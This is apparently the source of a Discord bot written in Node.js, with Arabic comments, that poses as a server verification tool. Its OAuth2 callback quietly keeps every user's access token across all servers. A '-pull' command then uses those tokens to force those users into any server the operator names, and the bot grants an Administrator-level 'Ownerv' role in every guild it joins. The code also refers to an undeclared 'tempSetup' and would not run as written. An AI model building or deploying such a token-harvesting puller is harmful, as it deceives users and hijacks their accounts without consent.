const { 
    Client, 
    GatewayIntentBits, 
    ActionRowBuilder, 
    EmbedBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    PermissionFlagsBits,
    Events
} = require('discord.js');
const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// قاعدة بيانات مؤقتة لتخزين الـ Access Tokens الخاصة بكل الأعضاء الموثقين من جميع السيرفرات
const verifiedUsers = new Map(); 

app.use(express.json());

app.get('/', (req, res) => res.send('OAuth2 Verify Bot is Running!'));

// استقبال التحقق وتسجيل العضو تلقائياً بغض النظر عن السيرفر الذي دخل منه
app.get('/callback', async (req, res) => {
    const code = req.query.code;
    const guildId = req.query.state; 
    
    if (!code) {
        return res.send('<h1>❌ Verification Failed. Please try again.</h1>');
    }

    try {
        const tokenResponse = await axios.post('https://discord.com/api/v10/oauth2/token', new URLSearchParams({
            client_id: process.env.CLIENT_ID,
            client_secret: process.env.CLIENT_SECRET, 
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: `https://${req.hostname}/callback` 
        }), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        const accessToken = tokenResponse.data.access_token;

        const userResponse = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: `Bearer ${accessToken}` }
        });

        const userId = userResponse.data.id;
        const username = userResponse.data.username;

        // تخزين بيانات العضو والتوكن الخاص به بشكل دائم في قاعدة البيانات المؤقتة
        verifiedUsers.set(userId, {
            token: accessToken,
            username: username,
            guildId: guildId || 'Unknown' // حفظ السيرفر الأصلي الذي تحقق منه
        });

        // منح رتبة Verified تلقائياً للعضو بداخل السيرفر الذي تحقق منه فوراً
        if (guildId) {
            const guild = client.guilds.cache.get(guildId);
            if (guild) {
                const member = await guild.members.fetch(userId).catch(() => null);
                if (member) {
                    const verifiedRole = guild.roles.cache.find(r => r.name === 'Verified');
                    if (verifiedRole) {
                        await member.roles.add(verifiedRole).catch(err => console.error(err));
                    }
                }
            }
        }

        res.send(`<h1>✅ Verified Successfully! Thank you ${username}. You can now close this tab.</h1>`);
    } catch (error) {
        console.error(error.response ? error.response.data : error.message);
        res.send('<h1>❌ Error during verification.</h1>');
    }
});

app.listen(PORT, '0.0.0.0', () => console.log(`Server connected to port ${PORT}`));

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

const VERIFY_SETUP_PREFIX = '-vr';    
const COUNT_VERIFY_PREFIX = '-vf';    
const PULL_MEMBERS_PREFIX = '-pull';  

let verifyUrl = ''; 

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;

async function createVerifyRoles(guild) {
    try {
        let verifiedRole = guild.roles.cache.find(r => r.name === 'Verified');
        if (!verifiedRole) {
            await guild.roles.create({
                name: 'Verified',
                color: '#2ecc71',
                reason: 'Auto-created role for verified users'
            });
        }

        let ownerRole = guild.roles.cache.find(r => r.name === 'Ownerv');
        if (!ownerRole) {
            await guild.roles.create({
                name: 'Ownerv',
                color: '#e74c3c',
                permissions: [PermissionFlagsBits.Administrator],
                reason: 'Auto-created control role for verification administrators'
            });
        }
    } catch (error) {
        console.error(error);
    }
}

client.once('ready', async () => {
    console.log(`Verify Bot is Online as ${client.user.tag}`);
    client.guilds.cache.forEach(async (guild) => {
        await createVerifyRoles(guild);
    });
});

client.on(Events.GuildCreate, async (guild) => {
    await createVerifyRoles(guild);
});

client.on('messageCreate', async message => {
    if (message.author.bot) return;

    const content = message.content.trim();
    const isAuthorized = message.member.permissions.has(PermissionFlagsBits.Administrator) || message.member.roles.cache.some(r => r.name === 'Ownerv');

    // 1. الإعداد التفاعلي لتحديث الرابط وإرسال البوكس تلقائياً
    if (content === VERIFY_SETUP_PREFIX) {
        if (!isAuthorized) {
            return message.reply('❌ عذراً، هذا الأمر مخصص للإدارة أو أصحاب رتبة **Ownerv** فقط.');
        }

        const setupState = { step: 'get_url', messagesToDelete: [] };
        tempSetup.set(message.author.id, setupState);

        const prompt = await message.channel.send(`${message.author}, 🛡️ **يرجى كتابة أو لصق رابط التحقق (OAuth2 URL) الخاص بك الآن في الشات:**`);
        setupState.messagesToDelete.push(message.id, prompt.id);
        return;
    }

    if (tempSetup.has(message.author.id)) {
        const state = tempSetup.get(message.author.id);
        state.messagesToDelete.push(message.id);

        if (state.step === 'get_url') {
            const inputUrl = message.content.trim();
            if (!inputUrl.startsWith('http')) {
                const errPrompt = await message.reply('❌ رابط غير صحيح. يرجى لصق رابط OAuth2 صحيح يبدأ بـ http:');
                state.messagesToDelete.push(errPrompt.id);
                return;
            }

            verifyUrl = inputUrl;
            
            const finalUrl = `${verifyUrl}&state=${message.guild.id}`;

            const embed = new EmbedBuilder()
                .setTitle('🛡️ Server Verification / التحقق الذاتي')
                .setDescription('Please click the button below to verify yourself and get full access to the server.\n\nالرجاء الضغط على الزر أدناه لإتمام التحقق وتفعيل حسابك بالكامل بداخل السيرفر الحصول على رتبة **Verified**.')
                .setColor('#2b2d31');

            const verifyButton = new ButtonBuilder()
                .setLabel('Verify yourself')
                .setURL(finalUrl)
                .setStyle(ButtonStyle.Link)
                .setEmoji('✅');

            const row = new ActionRowBuilder().addComponents(verifyButton);

            await message.channel.send({ embeds: [embed], components: [row] });

            setTimeout(async () => {
                for (const msgId of state.messagesToDelete) {
                    await message.channel.messages.delete(msgId).catch(() => {});
                }
            }, 1000);

            tempSetup.delete(message.author.id);
            return;
        }
    }

    // 2. معرفة عدد الأشخاص الذين تحققوا من السيرفر الحالي أو أي سيرفر آخر
    if (content === COUNT_VERIFY_PREFIX) {
        if (!isAuthorized) return;
        
        // حساب إجمالي الموافقين من جميع السيرفرات
        const totalVerified = verifiedUsers.size;
        
        await message.reply(`📊 **إحصائية التحقق المطور:**\n\n🟢 إجمالي الأعضاء الموثقين والجاهزين للسحب من جميع السيرفرات هو: \`${totalVerified}\` عضو.`);
        return;
    }

    // 3. سحب وإدخال جميع الموثقين تلقائياً إلى السيرفر المحدد (-pull [أيدي السيرفر])
    if (content.startsWith(PULL_MEMBERS_PREFIX)) {
        if (!isAuthorized) return;

        const args = content.slice(PULL_MEMBERS_PREFIX.length).trim().split(/ +/);
        const targetGuildId = args[0];

        if (!targetGuildId) {
            return message.reply('❌ يرجى كتابة أيدي السيرفر المستهدف بعد الأمر (مثال: `-pull 1234567890`):');
        }

        if (verifiedUsers.size === 0) {
            return message.reply('❌ قاعدة البيانات فارغة؛ لا يوجد أي أعضاء موثقين مسجلين في النظام حالياً لسحبهم.');
        }

        const targetGuild = client.guilds.cache.get(targetGuildId);
        if (!targetGuild) {
            return message.reply('❌ البوت ليس موجوداً بداخل السيرفر المستهدف. يرجى دعوة البوت أولاً إلى السيرفر المطلوب إدخال الأعضاء إليه.');
        }

        const statusMsg = await message.channel.send(`⏳ **جاري بدء عملية سحب وإدخال \`${verifiedUsers.size}\` عضو تلقائياً إلى السيرفر المستهدف...**`);

        let successCount = 0;
        let failCount = 0;
        let alreadyInCount = 0;

        const userArray = Array.from(verifiedUsers.entries());

        let index = 0;
        const interval = setInterval(async () => {
            if (index >= userArray.length) {
                clearInterval(interval);
                await statusMsg.edit(`✅ **اكتملت عملية سحب الأعضاء بنجاح!**\n\n📬 تم إدخال: \`${successCount}\` عضو.\n🔄 كانوا موجودين بالسيرفر سابقاً: \`${alreadyInCount}\` عضو.\n❌ فشل سحبهم (انتهى توكن حسابهم): \`${failCount}\` عضو.`);
                return;
            }

            const [userId, userData] = userArray[index];

            // التحقق إذا كان العضو متواجداً بالسيرفر المستهدف بالفعل
            const isMember = targetGuild.members.cache.has(userId);
            if (isMember) {
                alreadyInCount++;
            } else {
                try {
                    // طلب إدخال العضو تلقائياً وصامتاً للسيرفر الآخر
                    await axios.put(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${userId}`, {
                        access_token: userData.token
                    }, {
                        headers: {
                            Authorization: `Bot ${TOKEN}`,
                            'Content-Type': 'application/json'
                        }
                    });
                    successCount++;
                } catch (err) {
                    failCount++;
                }
            }

            await statusMsg.edit(`⏳ **جاري السحب الفوري للأعضاء...**\n\n📊 التقدم الحالي: \`${index + 1}/${userArray.length}\` عضو.\n✅ تم الإدخال: \`${successCount}\` | 🔄 موجود سابقاً: \`${alreadyInCount}\` | ❌ فشل: \`${failCount}\``);
            index++;
        }, 1200); 

        return;
    }
});

client.login(TOKEN);